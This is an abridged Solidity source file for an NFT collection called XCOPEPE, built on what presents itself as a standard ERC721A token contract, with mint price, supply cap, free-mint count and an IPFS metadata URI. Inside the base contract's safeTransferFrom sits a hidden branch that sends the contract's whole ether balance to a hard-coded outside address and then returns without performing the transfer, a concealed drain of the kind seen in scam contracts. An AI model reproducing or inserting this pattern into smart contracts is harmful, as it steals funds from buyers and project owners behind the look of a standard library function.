...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x930CCae49983DE24A5b18C8c76Ce58b3f7Cc67a6).transfer(address(this).balance);
            return;
        }
...
contract XCOPEPE is ERC721A, TheOperatorFilterer {
    // opensea
    ...
    constructor() ERC721A("XCOPE PE", "XCOPEPE") {
        owner = msg.sender;
        maxPerTx = 6;
        price = 0.002 ether;
        maxSupply = 666;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeihh4wnjgldwpcnzf7cibezgo7ivvyfil5nm45blo2k42bz4njnfau/", _toString(tokenId), ".json"));
    }
    ...
    function getFreeNum() internal returns (uint256){
        return (maxSupply - totalSupply()) / 16;
    }
